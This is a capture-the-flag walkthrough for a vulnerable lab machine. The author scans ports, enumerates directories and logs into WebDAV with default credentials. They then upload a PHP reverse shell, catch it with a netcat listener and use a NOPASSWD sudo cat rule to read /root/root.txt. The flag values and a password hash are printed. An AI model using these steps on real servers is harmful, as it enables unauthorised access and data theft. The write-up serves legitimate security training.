# User Flag
- Scanned ports with `rustscan` and found one port running on the machine

```console
❯ rustscan -a 10.10.39.98  --ulimit 5000 -- -sC -sV -vvv | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.39.98:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-25 19:12 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
Initiating Ping Scan at 19:12
Scanning 10.10.39.98 [2 ports]
Completed Ping Scan at 19:12, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:12
Completed Parallel DNS resolution of 1 host. at 19:12, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:12
Scanning 10.10.39.98 [1 port]
Discovered open port 80/tcp on 10.10.39.98
Completed Connect Scan at 19:12, 0.15s elapsed (1 total ports)
Initiating Service scan at 19:12
Scanning 1 service on 10.10.39.98
Completed Service scan at 19:12, 6.31s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.39.98.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 2.77s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.61s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
Nmap scan report for 10.10.39.98
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-11-25 19:12:19 IST for 10s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.64 seconds
```

- Checked out the web port 80 manually, but found default page for ubuntu.
- Then started `gobuster` on the web-server and found a directory named `webdav`.

```console
❯ gobuster dir --url http://10.10.39.98 -w /usr/share/wordlists/dirb/common.txt -x php,js,html,txt | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.39.98
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,html,txt
[+] Timeout:                 10s
===============================================================
2022/11/25 19:03:57 Starting gobuster in directory enumeration mode
===============================================================
/.hta.txt             (Status: 403) [Size: 294]
/.hta                 (Status: 403) [Size: 290]
/.hta.php             (Status: 403) [Size: 294]
/.hta.js              (Status: 403) [Size: 293]
/.hta.html            (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd.php        (Status: 403) [Size: 299]
/.htaccess.php        (Status: 403) [Size: 299]
/.htpasswd.js         (Status: 403) [Size: 298]
/.htaccess.js         (Status: 403) [Size: 298]
/.htpasswd.html       (Status: 403) [Size: 300]
/.htaccess.html       (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 295]
/.htaccess.txt        (Status: 403) [Size: 299]
/.htpasswd.txt        (Status: 403) [Size: 299]
/index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 299]
/webdav               (Status: 401) [Size: 458]
```

- On connecting to `http://webdav.thm/webdav` it asks for password.

```console
❯ curl http://webdav.thm/webdav
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at webdav.thm Port 80</address>
</body></html>
```

- Found an exploit for `webdav` [here](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html){:target="\_blank"}.
- It says to connect to the server with `cadaver`, with default credentials `wampp:xampp`.
- Exploited `webdav`.

```console
❯ cadaver http://10.10.39.98/webdav/
Authentication required for webdav on server `10.10.39.98':
Username: wampp
Password:
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        passwd.dav                            44  Aug 26  2019
```

- Downloaded `passwd.dav` and uploaded a `php-reverse-shell`.

```console
dav:/webdav/> get passwd.dav
Downloading `/webdav/passwd.dav' to passwd.dav:
Progress: [=============================>] 100.0% of 44 bytes succeeded
dav:/webdav/> put php-reverse-shell.php
Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':
Progress: [=============================>] 100.0% of 5495 bytes succeeded.
```

- Now accessed `http://10.10.39.98/webdav/php-reverse-shell.php`, with `xampp:wampp`, after starting a `netcat` listener.
- Got a reverse shell.

```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.39.98] 60936
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 06:14:35 up 44 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (704): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/$
```

- Found a user named `wampp`, we also got credentials from `passwd.dav`, for `wampp`

```console
❯ cat passwd.dav
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

- Checked hash with `hash-identifier`

```console
❯ echo "\$apr1\$Wm2VTkFL\$PVNRQv7kzqXQIHe14qKA91"  | hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH:
Possible Hashs:
[+] MD5(APR)
--------------------------------------------------
 HASH: Traceback (most recent call last):
  File "/usr/share/hash-identifier/hash-id.py", line 568, in <module>
    h = input(" HASH: ")
EOFError: EOF when reading a line
```

- It is `MD5`, tried cracking with `john-the-ripper`, didn't  find any password.

```console
❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:21 58.22% (ETA: 19:52:06) 0g/s 58504p/s 58504c/s 58504C/s ehelkay..ehbnax
0g 0:00:02:56 71.04% (ETA: 19:52:11) 0g/s 56772p/s 56772c/s 56772C/s amazeing..amayak
0g 0:00:03:42 84.38% (ETA: 19:52:27) 0g/s 53635p/s 53635c/s 53635C/s 5797295..57957032
0g 0:00:04:30 DONE (2022-11-25 19:52) 0g/s 52137p/s 52137c/s 52137C/s  ejngyhga007..*7¡Vamos!
Session completed.

```
- We need to search for another way for privilege escalation.

```console
www-data@ubuntu:/$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat

```

- We don't need other user access to read the user flag, **THIS IS AN EASY BOX**.
- Searched for `user.txt`, and found it in `/home/merlin`

```console
www-data@ubuntu:/$ ls -l /home/merlin/user.txt
-rw-rw-r-- 1 merlin merlin 33 Aug 25  2019 /home/merlin/user.txt
```

- We have read permissions
- Checked out user flag

```console
www-data@ubuntu:/$ cat /home/merlin/user.txt
449b40fe93f78a938523b7e4dcd66d2a
```

# Root Flag

```console
www-data@ubuntu:/$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

- Found root flag

```console
www-data@ubuntu:/$ sudo -u root cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5

```
